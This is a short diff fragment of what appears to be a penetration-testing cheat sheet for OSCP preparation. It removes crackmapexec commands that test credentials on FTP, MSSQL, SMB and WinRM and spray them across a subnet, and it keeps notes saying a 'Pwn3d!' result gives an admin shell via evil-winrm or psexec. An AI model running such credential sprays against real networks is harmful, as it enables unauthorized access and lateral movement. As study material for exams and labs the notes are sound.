-
-# FTP
-crackmapexec ftp $IP -u $USER -p $PASS
-
-# MSSQL
-crackmapexec mssql $IP -u $USER -p $PASS
-
-# Spray across subnet (OSCP internal network)
-crackmapexec smb $SUBNET/24 -u $USER -p $PASS --continue-on-success
-crackmapexec winrm $SUBNET/24 -u $USER -p $PASS
-
-# ── READ CME OUTPUT ───────────────────────
+# ── READ OUTPUT ───────────────────────────
 # [+] = valid creds
-# (Pwn3d!) = local admin — instant shell
-# Use evil-winrm or psexec if Pwn3d
+# (Pwn3d!) = local admin — instant shell via evil-winrm or psexec
 
 # ── CONNECT WITH VALID CREDS ─────────────
 # WinRM (most common)
